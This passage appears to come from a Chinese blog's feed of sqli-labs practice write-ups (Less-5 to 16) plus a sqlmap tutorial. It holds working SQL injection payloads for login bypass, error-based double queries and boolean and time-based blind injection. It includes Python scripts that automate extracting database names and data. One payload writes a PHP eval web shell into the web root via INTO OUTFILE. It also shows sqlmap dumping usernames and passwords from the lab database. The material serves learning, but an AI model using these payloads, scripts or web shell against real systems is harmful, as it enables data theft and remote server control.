&apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; //echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; //echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 登入成功返回的是flag.jpg图片，图片显示successfully logined in；失败是slap.jpg的图片。不会显示登入的账号和密码信息 payload万能密码登入uname=test &amp;passwd=test&apos;) or 1=1%23 双注入查询原理参考Less-5 uname=test &amp;passwd=test&apos;) or 1=1 order by 3 %23返回错误 uname=test &amp;passwd=test&apos;) or 1=1 order by 2 %23返回正常 uname=test &amp;passwd=test&apos;) or 1=1 union select 1,2 %23返回成功但是没有显示位 使用双查询注入方式 uname=test &amp;passwd=test&apos;) union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回 Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; 剩下的参考Less-5 Less-14 POST-Double Injection-Double quotes-String-with twist测试单引号 uname=test &amp;passwd=test&apos; or 1=1 %23返回失败图片 双引号 uname=test &amp;passwd=test&quot;or 1=1 %23 返回成功图片 参数是由双引号包裹 源代码 $uname=&apos;&quot;&apos;.$uname.&apos;&quot;&apos;; $passwd=&apos;&quot;&apos;.$passwd.&apos;&quot;&apos;; @$sql=&quot;SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1&quot;; 注意点号是起连接作用，将变量一前一后分别连接一个双引号这里调试直接echo出变量可以看到 uname=uname &amp;passwd=passwd 输出：&quot;uname &quot;&quot;passwd&quot; 可以看到是单引号包裹着 测试字段数 uname=uname &amp;passwd=passwd&quot; or 1=1 order by 2 %23 剩下的与Less-13相似 Less-15 POST-Blind-Boolian/time Based-Single quotes基于布尔型或时间的单引号post盲注测试在后面添加单引号、双引号、括号等无任何错误显示，只显示一个错误的图片，错误回显应该是被注释了。 uname=uname &amp;passwd=passwd&apos; or 1=1 %23返回正确 字段数 uname=uname &amp;passwd=passwd&apos; or 1=1 order by 2 %23 显示位 uname=uname &amp;passwd=passwd&apos; or 1=1 union select 1,2 %23执行成功没有回显 使用双查询输入 uname=test &amp;passwd=test&apos; or 1=1 union select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a %23 返回成功但并没有报错显示我们想要的数据 为什么Less13-14中使用双查询输入有效而在这里不行？Less-15源代码 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;])) { $uname=$_POST[&apos;uname&apos;]; $passwd=$_POST[&apos;passwd&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;User Name:&apos;.$uname); fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;; //echo &quot; You Have successfully logged in\n\n &quot; ; echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Login name:&apos;. $row[&apos;username&apos;]; echo &quot;&lt;br&gt;&quot;; //echo &apos;Your Password:&apos; .$row[&apos;password&apos;]; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;; //echo &quot;Try again looser&quot;; //print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;; echo &quot;&lt;/font&gt;&quot;; } } ?&gt; 查看对比两者的源代码可以发现在本关中print_r(mysql_error());函数被注释了 payload这里使用布尔型盲注 uname=test &amp;passwd=test&apos; or length((select database())) =8 %23 返回正确 剩下参考Less-8 Less-16 POST-Blind-Boolian/Time Based-Double quotes基于布尔型或时间的双引号post盲注测试uname=test &amp;passwd=test &apos; or 1=1 %23返回错误 uname=test &amp;passwd=test&apos;) or 1=1 %23返回错误 uname=test &amp;passwd=test &quot; or 1=1 %23返回错误 uname=test &amp;passwd=test&quot;) or 1=1 %23返回正确 payload字段数 uname=test &amp;passwd=test &quot;) or 1=1 order by 2%23返回正确 uname=test &amp;passwd=test &quot;) or 1=1 order by 3%23返回错误 剩下参考Less-15]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-8-10]]></title>
    <url>%2F2018%2F04%2F22%2Fsqli-labs-Less-8-10%2F</url>
    <content type="text"><![CDATA[Less-8 GET-Blind-Boolian Based - Single Quotes布尔型单引号GET盲注盲注当不能通过直接显示来获取数据库数据时，使用盲注的方式，根据其返回页面的不同来判断信息(页面内容不同，响应时间)；一般分为布尔型盲注，时间性盲注，报错盲注。 盲注常用函数 函数 功能 length(str) 返回str字符串的长度。 substr(str, pos, len) 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始 mid(str,pos,len) 跟上面的一样，截取字符串 ascii(str) 返回字符串str的最左面字符的ASCII代码值。 ord(str) 同上，返回ascii码 if(a,b,c) a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0 select database() 查询数据库 ascii(substr((select database()),1,1)) 返回数据库名称的第一个字母,转化为ascii码 ascii(substr((select database()),1,1))&gt;64 ascii大于64就返回true，if就返回1，否则返回0 常见的ASCII，A:65,Z:90 a:97,z:122, 0:48, 9:57 布尔型盲注盲注固定式:and ascii(substr(A,1,1))&gt;B and if(ascii(substr(A,1,1))&gt;B,1,0) A 通过是一个select语句，B则是字符串或数字的ascii码，中心思想是通过substr等截取函数以二分法的形式逐个查询匹配想要的信息，过程耗时繁琐。 payload源代分析 &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; //echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; 参数id是由单引号包裹，报错显示函数被注释掉了，之前的双查询注入方法不适用 正确时返回 Welcome Dhakkan You are in...... 错误时返回 Welcome Dhakkan 注入方法sqli-labs/Less-8/?id=1 返回正常 sqli-labs/Less-8/?id=1&apos; 返回错误 sqli-labs/Less-8/?id=1&apos;%23 返回正常，可知是单引号闭合 猜解系统中所有的数据库名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) = 105%23 这里猜到了字母 i 查询当前数据库名长度 sqli-labs/Less-8/?id=1&apos; and length((select database())) =8 %23 长度为 8 查询数据库名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) &gt; 50 %23 返回正常 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select database()),1,1)) =115 %23 通过二分法确定了数据库名的首字母的ascii码值为115（s） 猜解security数据库中的表名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema =&apos;security&apos; limit 1,1),1,1)) = 114 %23 猜解users表中的列名 sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name =&apos;users&apos; limit 1,1),1,1)) =117 %23 python爆破小脚本#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &apos;http://xxx.xxx.xxx.xxx/&apos; #获取数据长度 def getDataLen(url,payload,min,max): num_min = min num_max = max while min &lt; max: num_mid = (num_min + num_max) /2 #print num_min,num_mid,num_max if (num_max == num_mid) or (num_min == num_mid): num = num_max if not re.findall(r&apos;You are in&apos;,requests.get(url + payload % num_min).text): num = num_min #print &apos;find num = %d&apos; % num return num payload_new = payload % num_mid finalurl = url + payload_new #print finalurl r = requests.get(finalurl) html = r.text result = re.findall(r&apos;You are in&apos;,html) if result: num_min = num_mid + 1 elif not result: num_max = num_mid #获取当前数据库名 def getCurrentDBName(): payload_len = &apos;sqli-labs/Less-8/?id=1\&apos;and length((select database())) &gt; %d %%23 &apos; print &apos;获取数据库名长度&apos; DBNameLen = getDataLen(url,payload_len,1,50) print &apos;DBNameLen: %s&apos; % DBNameLen print &apos;获取数据库名&apos; payloadstart = &apos;sqli-labs/Less-8/?id=1\&apos; and ascii(substr((select database()),%d,1))&apos; payloadend = &apos;&gt; %s %%23&apos; DBName = &apos;&apos; for i in range(1,DBNameLen+1): payload1 = payloadstart % i payload2 = payload1 + payloadend ascii_s = getDataLen(url,payload2,0,128) DBName += chr(ascii_s) print &apos;DBName: %s&apos; % DBName #获取数据库系统中所有的数据库名 def getAllDBName(): payload_start = &apos;sqli-labs/Less-8/?id=1\&apos; and &apos; payload_select = &apos;select schema_name from information_schema.schemata limit %d,1&apos; payload_ascii1 = &apos; ascii(substr((%s)&apos; payload_ascii2 = &apos;,%d,1))&apos; payload_end = &apos;&gt; %s %%23&apos; DBNameLen = [] for i in range(0,10):#此处默认系统中最多有十个数据库 payload_selecti = payload_select % i payload_lengthi = &apos;length((%s))&apos; % payload_selecti payload_end = &apos;&gt; %s %%23&apos; payload = payload_start + payload_lengthi + payload_end #print payload DBNameLen.append(getDataLen(url,payload,0,50)) print &apos;系统中各个数据库的长度&apos; print DBNameLen #DBNameLen = [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] DBName = [] for i in range(0,len(DBNameLen)): print &apos;获取第%d个数据库名&apos; % i payload_selecti = payload_select % i DBNames = &apos;&apos; for j in range(1,DBNameLen[i]+1): payload_ascii1j = payload_ascii1 % payload_selecti payload_ascii2j = payload_ascii2 % j payload = payload_start + payload_ascii1j + payload_ascii2j + payload_end ascii_s = getDataLen(url,payload,0,128) DBNames += chr(ascii_s) print DBNames DBName.append(DBNames) print DBName #获取某个数据库的所有表名 #获取某个表的所有的列名 #获取某个列的所有值 if __name__ == &apos;__main__&apos;: getCurrentDBName() getAllDBName() 结果： 获取数据库名长度 DBNameLen: 8 获取数据库名 DBName: security 系统中各个数据库的长度 [18, 10, 5, 18, 8, 4, 0, 0, 0, 0] 获取第0个数据库名 information_schema 获取第1个数据库名 challenges 获取第2个数据库名 mysql 获取第3个数据库名 performance_schema 获取第4个数据库名 security 获取第5个数据库名 test 获取第6个数据库名 获取第7个数据库名 获取第8个数据库名 获取第9个数据库名 [&apos;information_schema&apos;, &apos;challenges&apos;, &apos;mysql&apos;, &apos;performance_schema&apos;, &apos;security&apos;, &apos;test&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;, &apos;&apos;] 在这里只写了爆破当前数据库名和爆破系统中所有数据库名的部分，后面的表和列的部分类似 Less-9 GET-Time base-Single Quotes时间型单引号get盲注时间型和布尔型的区别在于：时间型无论输入是否合法，返回的页面是相同的，查看源代码确实如此： &lt;?php //including the Mysql connect parameters. include(&quot;../sql-connections/sql-connect.php&quot;); error_reporting(0); // take the variables if(isset($_GET[&apos;id&apos;])) { $id=$_GET[&apos;id&apos;]; //logging the connection parameters to a file for analysis. $fp=fopen(&apos;result.txt&apos;,&apos;a&apos;); fwrite($fp,&apos;ID:&apos;.$id.&quot;\n&quot;); fclose($fp); // connectivity $sql=&quot;SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in...........&apos;; //print_r(mysql_error()); //echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;; echo &apos;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&apos;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} ?&gt; 时间型盲注 函数 作用 sleep() 延时执行，MySQL 5 benchmark() 延时执行，MySQL 4/5 判断是否为时间型盲注sqli-labs/Less-9/?id=1&apos; and sleep(5) %23 或 sqli-labs/Less-9/?id=1&apos; and if(1=1,sleep(5),null) %23 执行后延迟了大概5秒左右才返回，可进行时间型盲注 payload猜解当前数据库 sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),1,1))=115, 0,sleep(5)) 剩下的payload构造与Less-8类似 Less-10 GET-Time based - double quotes时间型双引号get盲注这里只要把Less-9的单引号改为双引号即可]]></content>
      <tags>
        <tag>Python</tag>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqli-labs-Less-5-7]]></title>
    <url>%2F2018%2F04%2F20%2Fsqli-labs-Less-5-6%2F</url>
    <content type="text"><![CDATA[Less-5 GET- Double Query-Single Quotes -String基于get请求的双查询的单引号字符型注入什么叫双查询？双查询又可以叫做嵌套子查询，相当于在select语句中还有一个select语句，而里面的select语句称为子查询 select(select) 双查询你注入当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。 函数 功能 count(*) 统计表中所有记录的个数 count(列名) 统计一列中值的个数，其中重复的记录也会被当做有效的记录。 count(distinct 列名) 统计一列中值的个数，其中重复的记录只会被记录一次。 sum(列名) 计算一列值的总和。 avg(列名) 计算一列值的平均值。 max(列名) 计算一列值中的最大值。 min(列名) 计算一列值中的最小值。 rand() 生成0-1之间的小数随机值 floor() 只返回整数部分，小数部分舍弃 round() 函数四舍五入，大于0.5的部分进位，不到则舍弃 concat() 连接函数，可以连接多个字符 group by 将结果以分组的形式返回 什么时候使用双查询注入？适用于注入时没有显示位，但是在有显示位的时候同样适用，有显示位时不建议。双查询注入语句的固定格式 union select 1 from (select+count(*),concat(floor(rand(0)*2),( 注入爆数据语句))a from information_schema.tables group by a)b 测试sqli-labs/Less-5/?id=1 返回如下，与之前不同 Welcome Dhakkan You are in........... 构造payloadselect count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a; 分析：0x3a 表示冒号，rand()2 返回 0-2之间的随机数，floor(rand()2)返回整数0或1。 concat()将返回 ::关键信息::0或者::关键信息::1 字段数sqli-labs/Less-5/?id=1&apos; order by 6 %23 返回错误 sqli-labs/Less-5/?id=1&apos; order by 5%23 返回正确 数据库基本信息sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 返回 Welcome Dhakkan Duplicate entry &apos;::security::1&apos; for key &apos;group_key&apos; 当前数据库名 sqli-labs/Less-5/?id=1&apos; union select 1,2,3,count(*) ,concat(0x3a,0x3a,version(),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a%23 版本号 Duplicate entry &apos;::5.5.53::0&apos; for key &apos;group_key&apos; 读取信息数据库名(改变 limit 1,1的值获取所有的)sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select schema_name from information_schema.schemata limit 1,1) )a from information_schema.tables group by a)b %23 表名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1) )a from information_schema.columns group by a)b %23 列名sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1) )a from information_schema.columns group by a)b %23 数据sqli-labs/Less-5/?id=1&apos; union select 1 from (select+count(*),concat(floor(rand(0)*2),( select password from security.users limit 0,1) )a from information_schema.columns group by a)b %23 python 小脚本用来爆破(limit太麻烦)#!/usr/bin/python #-*-encoding:utf-8-*- import requests import re url = &quot;http://192.168.83.134/sqli-labs/Less-5/&quot; #获取数据 def getData(url,payload,file_name): files = open(file_name,&apos;a&apos;) #print url+payload r = requests.get(url+payload) html = r.text #print html data = re.findall(r&apos;::\w{0,20}::&apos;,html) for i in data: files.write(i) files.close() #获取所有数据库名 def getDatabaseName(): filename = &apos;file_databasename.txt&apos; for i in range(0,20): payload_databases = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select schema_name from information_schema.schemata limit %s,1),0x3a,0x3a,floor(rand(0)*2) )a from information_schema.tables group by a)b %%23&apos; % i getData(url,payload_databases,filename) #获取某个数据库的所有表名 def getTableName(databasename): filename = &apos;file_tablename.txt&apos; for i in range(0,20): payload_tables = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,( select table_name from information_schema.tables where table_schema=%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (databasename, i) getData(url,payload_tables,filename) #获取某个表中的所有字段名 def getColumnName(tablename): filename = &apos;file_columnname.txt&apos; for i in range(0,20): payload_columns = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name= %s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (tablename,i) getData(url,payload_columns,filename) #获取某个表中的数据 def getColumnData(databasename,tablename,columnname): filename = columnname+&apos;_data.txt&apos; for i in range(0,20): payload_columndata = &apos;?id=1\&apos; union select 1 from (select+count(*),concat(0x3a,0x3a,(select %s from %s.%s limit %s,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a)b %%23&apos; % (columnname,databasename,tablename,i) getData(url,payload_columndata,filename) if __name__ == &apos;__main__&apos;: #获取数据库中所有的数据库名 print &apos;获取数据库中所有数据库名&apos; getDatabaseName() #获取security数据库的所有表 print &apos;获取security数据库的所有表&apos; databasename = &quot;&apos;security&apos;&quot; getTableName(databasename) #获取表中的字段名 print &apos;获取users表的所有字段名&apos; tablename = &quot;&apos;users&apos;&quot; getColumnName(tablename) #获取users表的username和password print &apos;获取users表的username&apos; databasename = &apos;security&apos; tablename = &apos;users&apos; columnname = &apos;username&apos; getColumnData(databasename,tablename,columnname) 输出四个文本：file_columnname.txt file_databasename.txt file_tablename.txt cat file_databasename.txt file_tablename.txt file_columnname.txt username_data.txt ::information_schema::::challenges::::mysql::::performance_schema::::security::::test:: ::emails::::referers::::uagents::::users:: ::id::::username::::password::::first_name::::last_name:: ::Dumb::::Angelina::::Dummy::::secure::::stupid::::superman::::batman::::admin::::admin1::::admin2::::admin3::::dhakkan::::admin4:: 有些地方还是使用了硬编码不够灵活，使用burpsuit的intruct模块爆破更快 Less-6 GET- Double Query-Double Quotes -String基于get方法请求的双引号双查询字符注入Less-6与Less-5基本一致，只要报单引号改为双引号即可，不再赘述。GET-Dump into outfile - String基于get方法的导出文件的字符型注入mysql导出数据的方法select ... into outfile &apos;filename&apos; select可以把被选择的行写入一个文件中，该文件被创建到服务器主机上，因此必须拥有file权限；输出不能是一个已存在的文件，防止文件数据被篡改；在unix中该文件被创建后是可读的，权限有MySQL服务器所有，只能读不能删除。 源码分析$sql=&quot;SELECT * FROM users WHERE id=((&apos;$id&apos;)) LIMIT 0,1&quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You are in.... Use outfile......&apos;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo &apos;&lt;font color= &quot;#FFFF00&quot;&gt;&apos;; echo &apos;You have an error in your SQL syntax&apos;; //print_r(mysql_error()); echo &quot;&lt;/font&gt;&quot;; } } else { echo &quot;Please input the ID as parameter with numeric value&quot;;} 参数id被单引号和双层括号包裹，正确时显示 You are in…. Use outfile….. 错误时显示 You have an error in your SQL syntax; 构造payloadsqli-labs/Less-7/?id=1&apos;)) %23 sqli-labs/Less-7/?id=1&apos;)) order by 6%23 返回错误 sqli-labs/Less-7/?id=1&apos;)) order by 5%23 返回正常 读写权限测试sqli-labs/Less-7/?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23 返回正常，说明具有读写权限 数据库路径和安装路径使用Less-5或Less-6的双查询注入方法发现不起作用对比了源代码后才知道在Less-7中把报错显示注释掉了。 //print_r(mysql_error()); 本来使用 @@basedir 和 @@datadir来查询安装路径和数据库路径这里查询不了，总之前的关卡可知 C:/phpStudy/MySQL/和C:\phpStudy\MySQL\data\推测出目录路径为C:\phpStudy\WWW\sqli-labs\Less-7\ 这里在测试的过程中把报错的注释去掉了，可以看到一个Mysql配置问题 --secure-file-priv option so it cannot execute this statement 在MySQL的目录下的一个my.ini的文件中添加secure_file_priv = 路径重启后执行成功 sqli-labs/Less-7/?id=1&apos;)) union select 1,2,version(),4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/1.txt&quot; %23 直接访问 http://192.168.83.134/sqli-labs/Less-7/1.txt 可以看到之前写的数据，试着写入一句话 sqli-labs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&apos;,4,5 into outfile &quot;C:/phpStudy/WWW/sqli-labs/Less-7/shell.php&quot; %23 写入成功后，能够直接访问，使用中国菜刀直接连接即可 参考：【科普文】双查询注入 Double SQL Injection(双查询注入)]]></content>
      <tags>
        <tag>Python</tag>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap使用指南]]></title>
    <url>%2F2018%2F04%2F19%2Fsqlmap%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用sqli-labs练习社区sqlmap（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 工具注入(sqlmap)简单演示简单测试 (-u url)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3 [*] starting at 15:33:02 [15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; [15:33:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1&apos; AND 1906=1906-- PKiX Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- PmIF Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX --- [15:33:03] [INFO] the back-end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 注：-v(–level) 3 同时显示注入的payload 列出数据库系统的数据库(–dbs)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [14:51:37] [INFO] fetching database names [14:51:38] [INFO] the SQL query used returns 6 entries [14:51:39] [INFO] retrieved: information_schema [14:51:41] [INFO] retrieved: challenges [14:51:42] [INFO] retrieved: mysql [14:51:43] [INFO] retrieved: performance_schema [14:51:44] [INFO] retrieved: security [14:51:45] [INFO] retrieved: test available databases [6]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security [*] test 列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:03:02] [INFO] fetching tables for database: &apos;security&apos; [15:03:03] [INFO] the SQL query used returns 4 entries [15:03:04] [INFO] retrieved: emails [15:03:05] [INFO] retrieved: referers [15:03:06] [INFO] retrieved: uagents [15:03:07] [INFO] retrieved: users Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ 列出数据库中的列(–column -T 表名 -D 数据库名 若无-D参数则默认当前数据库)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos; [15:08:36] [INFO] the SQL query used returns 5 entries [15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot; [15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot; [15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot; [15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot; [15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot; Database: security Table: users [5 columns] +------------+-------------+ | Column | Type | +------------+-------------+ | first_name | varchar(8) | | id | int(3) | | last_name | varchar(8) | | password | varchar(20) | | username | varchar(20) | +------------+-------------+ 获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos; [15:19:18] [INFO] the SQL query used returns 13 entries [15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot; [15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot; [15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot; [15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot; [15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot; [15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot; [15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot; [15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot; [15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot; [15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot; [15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot; [15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot; [15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot; [15:19:32] [INFO] analyzing table dump for possible password hashes Database: security Table: users [13 entries] +----------+------------+ | username | password | +----------+------------+ | Dumb | Dumb | | Angelina | I-kill-you | | Dummy | p@ssword | | secure | crappy | | stupid | stupidity | | superman | genious | | batman | mob!le | | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | dhakkan | dumbo | | 